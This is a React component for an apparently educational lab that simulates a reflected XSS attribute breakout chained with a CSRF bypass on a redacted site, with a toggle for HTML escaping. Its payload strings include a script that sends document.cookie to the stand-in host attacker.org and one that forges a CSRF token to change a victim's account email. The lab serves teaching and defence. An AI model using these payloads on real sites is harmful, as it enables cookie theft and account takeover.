import React, { useState, useEffect, useRef } from 'react';
import { Send, Check, Terminal, Shield, RefreshCw, AlertTriangle, Play, HelpCircle, Code, Lock } from 'lucide-react';

export default function XssPlayground() {
  const [selectedPayload, setSelectedPayload] = useState('alert');
  const [customInput, setCustomInput] = useState('"><img src="x" onerror="alert(7500)"/>');
  const [isPatchEnabled, setIsPatchEnabled] = useState(false);
  const [isFiring, setIsFiring] = useState(false);
  const [currentStep, setCurrentStep] = useState('idle'); // idle | request | server | browser
  
  // Simulated Target state
  const [stolenCookies, setStolenCookies] = useState([]);
  const [forgedRequests, setForgedRequests] = useState([]);
  const [alertsTriggered, setAlertsTriggered] = useState(0);
  const [showHtmlAlert, setShowHtmlAlert] = useState(false);
  const [alertMessage, setAlertMessage] = useState('');
  
  const [terminalLogs, setTerminalLogs] = useState([
    "🔓 Victim browser simulated state online.",
    "🍪 Cookies: [csrf_token=SECURE_981a, session_id=2a1f-HTTPONLY]",
    "💾 LocalStorage: [chat:matrix-access-token=matrix_live_oauth_sec, chat:access-token=tokenv2_secret_bear]"
  ]);

  const addTerminalLog = (msg) => {
    setTerminalLogs((prev) => [...prev, `[${new Date().toLocaleTimeString()}] ${msg}`]);
  };

  const getPayloadString = () => {
    switch (selectedPayload) {
      case 'alert':
        return '"><script>alert("Hacked! $7,500 Payload!")</script>lbbon=1';
      case 'cookie':
        return '"><script>fetch("https://attacker.org/log?cookies=" + document.cookie)</script>lbbon=1';
      case 'csrf':
        return '"><script>document.cookie="csrf_token=FORGED_H1;path=/;";fetch("/api/account/update-email",{method:"POST",body:"email=attacker@mal.org&csrf_token=FORGED_H1"})</script>lbbon=1';
      case 'custom':
        return customInput;
      default:
        return '';
    }
  };

  const escapeHtml = (text) => {
    return text
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;")
      .replace(/"/g, "&quot;")
      .replace(/'/g, "&#039;");
  };

  const handleFirePayload = () => {
    if (isFiring) return;
    setIsFiring(true);
    setCurrentStep('request');
    setShowHtmlAlert(false);

    const payload = getPayloadString();
    addTerminalLog(`📡 Transmitting payload query sequence to /svc/frontpage/events...`);

    // Step 1: Ingest request
    setTimeout(() => {
      setCurrentStep('server');
      addTerminalLog(`⚙️ Server [media-front-serv] parsing query parameters...`);
    }, 1200);

    // Step 2: Server interpolation
    setTimeout(() => {
      setCurrentStep('browser');
      addTerminalLog(`🖥️ Server response shipped back. Browser HTML Parser starting DOM evaluation...`);
    }, 2400);

    // Step 3: Browser Execution / Prevention
    setTimeout(() => {
      setIsFiring(false);
      
      if (isPatchEnabled) {
        addTerminalLog("🛡️ HTML ESCAPING APPLIED: Browser processed payload safely as continuous inline string content.");
        addTerminalLog("✅ Defended! No breakout was registered.");
      } else {
        // Run specific effects based on payload
        addTerminalLog("🚨 MALICIOUS ELEMENT INJECTED: Double quote bounds breached! Code evaluated under origin. ");
        
        if (selectedPayload === 'alert') {
          setAlertsTriggered(prev => prev + 1);
          setAlertMessage("Hacked! $7,500 Payload!");
          setShowHtmlAlert(true);
          addTerminalLog("💥 ALERT TRAPPED: alert('Hacked! $7,500 Payload!') successfully dispatched!");
        } else if (selectedPayload === 'cookie') {
          const freshCookies = ["edgebucket=XqEUIQBWQjs1Sh", "csrf_token=SECURE_981a"];
          setStolenCookies(freshCookies);
          addTerminalLog("💸 COKIE HEIST SUCCESS: Extracted non-HTTP-only cookies: [csrf_token=SECURE_981a]");
          addTerminalLog("📬 Transmitting stolen artifacts to: https://attacker.org/log...");
        } else if (selectedPayload === 'csrf') {
          const forged = {
            target: '/api/account/update-email',
            payload: 'email=attacker@mal.org',
            token: 'FORGED_H1'
          };
          setForgedRequests(prev => [...prev, forged]);
          addTerminalLog("😈 CSRF EXPLOITED: Mutated csrf_token cookie to 'FORGED_H1'");
          addTerminalLog("📧 Triggered state-mutative REST query to alter victim authentication parameters!");
        } else {
          // Custom
          if (payload.includes('alert')) {
            setAlertsTriggered(prev => prev + 1);
            setAlertMessage("Visual Fuzzing Success!");
            setShowHtmlAlert(true);
          }
          addTerminalLog("💀 CUSTOM RUNTIME CODE INTERPRETED. Watch terminal metrics!");
        }
      }
    }, 3800);
  };

  const handleResetSandbox = () => {
    setStolenCookies([]);
    setForgedRequests([]);
    setAlertsTriggered(0);
    setShowHtmlAlert(false);
    setIsFiring(false);
    setCurrentStep('idle');
    setTerminalLogs([
      "🧹 Sandbox telemetry flushed back to reference standard.",
      "🔓 Victim browser simulated state online.",
      "🍪 Cookies: [csrf_token=SECURE_981a, session_id=2a1f-HTTPONLY]",
      "💾 LocalStorage: [chat:matrix-access-token=matrix_live_oauth_sec, chat:access-token=tokenv2_secret_bear]"
    ]);
  };

  return (
    <div id="reflected-xss-playground" className="border-4 border-black bg-[#faf8f5] shadow-[8px_8px_0px_0px_rgba(0,0,0,1)] my-12 text-black overflow-hidden font-sans">
      
      {/* Header Info */}
      <div className="bg-[#ffb2bf] text-black border-b-4 border-black p-4 flex flex-col md:flex-row justify-between items-start md:items-center gap-4">
        <div>
          <span className="font-mono text-[10px] md:text-xs uppercase bg-black text-white border border-black px-2 py-0.5 font-bold tracking-wider select-none">
            👾 Lab Environment: XSS & CSRF Chain
          </span>
          <h4 className="font-heading text-xl md:text-2xl font-black uppercase mt-1">
            Reflected XSS Attribute Breakout Arena
          </h4>
        </div>
        <button 
          onClick={handleResetSandbox}
          disabled={isFiring}
          className="border-2 border-black bg-white hover:bg-neutral-100 font-heading font-black text-xs uppercase tracking-wide px-3 py-1.5 shadow-[2px_2px_0px_0px_rgba(0,0,0,1)] hover:translate-y-[1px] disabled:bg-neutral-200 cursor-pointer"
        >
          <RefreshCw className="inline-block mr-1 w-3.5 h-3.5" />
          Reset Lab
        </button>
      </div>

      {/* Settings Selector banner */}
      <div className="bg-neutral-900 text-white p-3 border-b-4 border-black flex flex-col md:flex-row justify-between items-start md:items-center gap-4 font-mono text-xs">
        <div className="flex items-center gap-2">
          <Shield className={`w-4 h-4 ${isPatchEnabled ? 'text-emerald-400' : 'text-red-500 animate-pulse'}`} />
          <span>SERVER-SIDE DEFENSE:</span>
          <button
            onClick={() => {
              setIsPatchEnabled(!isPatchEnabled);
              addTerminalLog(`⚙️ Server changed defense filter mode: ${!isPatchEnabled ? 'HTML_ENTITY_ESC' : 'NONE'}`);
            }}
            className={`px-2 py-0.5 text-black border border-black font-bold uppercase transition-all shadow-[2px_2px_0px_0px_rgba(255,255,255,1)] hover:translate-y-[1px] cursor-pointer ${
              isPatchEnabled ? 'bg-emerald-400' : 'bg-red-400'
            }`}
          >
            {isPatchEnabled ? 'PATCH ENABLED: HTML Escape active' : 'UNSAFE: raw raw interpolation'}
          </button>
        </div>
        <div className="text-zinc-400">
          Target Authority: <span className="text-cyan-400 font-bold select-all">www.█████████.com</span>
        </div>
      </div>

      {/* Grid splits */}
      <div className="grid grid-cols-1 lg:grid-cols-12 border-b-4 border-black divide-y-4 lg:divide-y-0 lg:divide-x-4 divide-black bg-white">
        
        {/* Left Side: Payload configurations */}
        <div className="lg:col-span-5 p-6 flex flex-col justify-between">
          <div className="space-y-4">
            <h5 className="font-heading font-black text-xs text-zinc-500 uppercase tracking-widest border-b border-dashed border-black pb-1">
              Configure Vector Payload
            </h5>
            
            <div className="space-y-2.5">
              {[
                { id: 'alert', label: '1. PoC: Simple Alert Trigger', desc: 'Break form double quotes and spawn an alert box of user identity verification.' },
                { id: 'cookie', label: '2. Cookie Theft Exfiltration', desc: 'Grab non-HTTPOnly anti-CSRF cookies and stream them to attackers remote server.' },
                { id: 'csrf', label: '3. Double-Submit CSRF Bypass', desc: 'Over-write CSRF token cookies in client and execute account recovery payload.' },
                { id: 'custom', label: '4. Live Visual Custom Fuzzer', desc: 'Type custom tags to observe how unescaped variables interact directly with attributes.' }
              ].map((p) => (
                <div 
                  key={p.id}
                  onClick={() => !isFiring && setSelectedPayload(p.id)}
                  className={`border-2 border-black p-3 rounded-none shadow-[3px_3px_0px_0px_rgba(0,0,0,1)] hover:translate-y-[1px] cursor-pointer transition-colors ${
                    selectedPayload === p.id ? 'bg-[#FFE600]' : 'bg-white hover:bg-neutral-50'
                  }`}
                >
                  <div className="font-heading font-black text-xs uppercase text-black">{p.label}</div>
                  <div className="font-sans text-[11px] text-neutral-600 mt-1 leading-snug">{p.desc}</div>
                </div>
              ))}
            </div>

            {selectedPayload === 'custom' && (
              <div className="pt-2 animate-fade-in">
                <label className="block font-mono text-[9px] uppercase tracking-wider text-neutral-400 font-bold mb-1">Payload query input string:</label>
                <input 
                  type="text" 
                  value={customInput}
                  disabled={isFiring}
                  onChange={(e) => setCustomInput(e.target.value)}
                  className="w-full border-2 border-black bg-neutral-50 p-2 font-mono text-xs focus:ring-0 focus:outline-none rounded-none text-black font-extrabold"
                />
              </div>
            )}
          </div>

          <div className="mt-8">
            <button
              onClick={handleFirePayload}
              disabled={isFiring}
              className="w-full border-4 border-black bg-black text-white hover:bg-zinc-800 p-4 font-heading font-black text-sm uppercase tracking-widest flex items-center justify-center gap-2.5 shadow-[5px_5px_0px_0px_rgba(255,178,191,1)] hover:translate-x-[1px] hover:translate-y-[1px] hover:shadow-[4px_4px_0px_0px_rgba(255,178,191,1)] active:translate-x-[4px] active:translate-y-[4px] active:shadow-none transition-all disabled:bg-neutral-200 disabled:text-neutral-500 disabled:shadow-none cursor-pointer"
            >
              <Send className="w-5 h-5 text-yellow-400 animate-pulse fill-yellow-400" />
              Transmit Exploit
            </button>
          </div>
        </div>

        {/* Right Side: Active Animation Visualizers */}
        <div className="lg:col-span-7 bg-neutral-50 p-6 flex flex-col justify-between">
          <div className="space-y-4">
            <h5 className="font-heading font-black text-xs text-zinc-500 uppercase tracking-widest border-b border-dashed border-black pb-1">
              Network & Buffer Processing Visualizer
            </h5>

            {/* Simulated request steps */}
            <div className="grid grid-cols-4 gap-2 font-heading text-[10px] uppercase font-black tracking-tighter text-center">
              {[
                { id: 'idle', label: '1. Neutral' },
                { id: 'request', label: '2. Sent' },
                { id: 'server', label: '3. Server' },
                { id: 'browser', label: '4. Rendered' }
              ].map((s) => (
                <div 
                  key={s.id} 
                  className={`p-2 border border-black ${
                    currentStep === s.id 
                      ? 'bg-amber-300 border-2 text-black animate-pulse' 
                      : s.id === 'idle' && currentStep === 'idle' ? 'bg-neutral-200/60' : 'bg-white text-neutral-400'
                  }`}
                >
                  {s.label}
                </div>
              ))}
            </div>

            {/* Raw HTTP code box */}
            <div className="border border-black bg-zinc-950 p-3 rounded-sm text-[10px] font-mono leading-tight shadow-inner text-teal-400 select-text overflow-x-auto">
              <div className="text-neutral-500 font-bold border-b border-white/10 pb-1 mb-1">// SIMULATED RECONNAISSANCE HTTP STACK</div>
              <div>GET /svc/frontpage/events?<span className="text-yellow-400 font-bold">{getPayloadString()}</span> HTTP/2</div>
              <div>Host: www.█████████.com</div>
              <div className="text-neutral-500">Cookie: csrf_token=SECURE_981a; session_id=2a1f-HTTPONLY</div>
            </div>

            {/* Server Template evaluation Box */}
            <div className="border border-black bg-[#2c1d2d] p-3 text-[10px] font-mono leading-relaxed text-pink-300 shadow-sm relative">
              <span className="absolute top-2 right-2 bg-yellow-400 text-black px-1.5 py-0.5 text-[8px] font-sans font-black uppercase rounded-sm select-none">
                {isPatchEnabled ? "SECURED PARSER" : "VULNERABLE TEMPLATE"}
              </span>
              <div className="text-neutral-500 font-bold pb-1">// SERVER-SIDE INTERPOLATION CODE</div>
              
              <div className="pl-2 border-l border-white/10 py-1 font-bold">
                &lt;form method="POST" action="/svc/frontpage/events?
                <span className={`px-1.5 py-0.5 rounded ${
                  isFiring && currentStep === 'server' ? 'bg-red-500 text-white animate-bounce' : 'bg-black/40 text-rose-300'
                }`}>
                  {isPatchEnabled ? escapeHtml(getPayloadString()) : getPayloadString()}
                </span>
                &captcha=1"&gt;
              </div>

              {isFiring && currentStep === 'server' && (
                <div className="mt-2 text-[9px] text-[#FFE600] font-sans font-bold flex items-center gap-1 animate-pulse">
                  <AlertTriangle className="w-3.5 h-3.5" />
                  {isPatchEnabled 
                    ? "Safe entity parser active: escapes quotes as &quot; preserving attribute bounds." 
                    : "Caution: Raw interpolation allows double quotes inside attribute to split form boundaries."
                  }
                </div>
              )}
            </div>

            {/* Target sandbox stats cards */}
            <div className="grid grid-cols-3 gap-3 pt-3">
              <div className="bg-white border border-black p-2 shadow-[2px_2px_0px_0px_rgba(0,0,0,1)] text-center">
                <span className="block text-[8px] uppercase text-neutral-400 font-bold font-mono">Alerts Spawns</span>
                <span className="block text-lg font-black text-black">{alertsTriggered}</span>
              </div>
              <div className="bg-white border border-black p-2 shadow-[2px_2px_0px_0px_rgba(0,0,0,1)] text-center">
                <span className="block text-[8px] uppercase text-neutral-400 font-bold font-mono">Stolen Cookies</span>
                <span className="block text-lg font-black text-rose-600">{stolenCookies.length}</span>
              </div>
              <div className="bg-white border border-black p-2 shadow-[2px_2px_0px_0px_rgba(0,0,0,1)] text-center">
                <span className="block text-[8px] uppercase text-neutral-400 font-bold font-mono">Forged Emails</span>
                <span className="block text-lg font-black text-amber-600">{forgedRequests.length}</span>
              </div>
            </div>

            {/* Log block */}
            <div className="border border-black bg-neutral-900 text-[#a0ffb5] p-2 text-[10px] font-mono h-28 overflow-y-auto rounded shadow-inner custom-scrollbar select-text lead-snug">
              <div className="text-zinc-400 font-bold text-[8px] uppercase border-b border-white/5 pb-1 mb-1 select-none">🖥️ Exploit Log Console</div>
              {terminalLogs.map((log, i) => (
                <div key={i} className="flex gap-1.5 items-start">
                  <span className="text-zinc-500 font-normal">→</span>
                  <span className={log.includes("🚨") || log.includes("💥") || log.includes("😈") ? "text-red-300 font-bold" : log.includes("🛡️") || log.includes("✅") ? "text-emerald-300 font-extrabold" : "text-emerald-200"}>{log}</span>
                </div>
              ))}
            </div>
          </div>
        </div>

      </div>

      {/* Pop Over Alert modal component simulator */}
      {showHtmlAlert && (
        <div className="fixed inset-0 bg-black/50 backdrop-blur-xs flex items-center justify-center z-50 p-4 animate-fade-in select-none">
          <div className="bg-[#faf8f5] border-4 border-black shadow-[8px_8px_0px_0px_rgba(0,0,0,1)] max-w-sm w-full p-4 text-black">
            <div className="flex items-center gap-2 border-b-2 border-dashed border-black pb-2 mb-3 bg-[#ffb2bf] -m-4 p-4">
              <AlertTriangle className="w-5 h-5 text-red-600 fill-red-200 animate-pulse" />
              <h6 className="font-heading font-black text-xs uppercase tracking-wider">Simulated Browser Dialog Box</h6>
            </div>
            <p className="font-sans text-xs bg-white border border-neutral-300 p-3 font-mono text-center">
              "{alertMessage}"
            </p>
            <div className="mt-4 flex justify-end">
              <button 
                onClick={() => setShowHtmlAlert(false)}
                className="border-2 border-black bg-[#FFE600] text-black font-heading font-black text-xs uppercase px-4 py-1.5 shadow-[2px_2px_0px_0px_rgba(0,0,0,1)] hover:translate-y-[1px] active:translate-y-[2px] active:shadow-none cursor-pointer"
              >
                Dismiss Modal
              </button>
            </div>
          </div>
        </div>
      )}

    </div>
  );
}
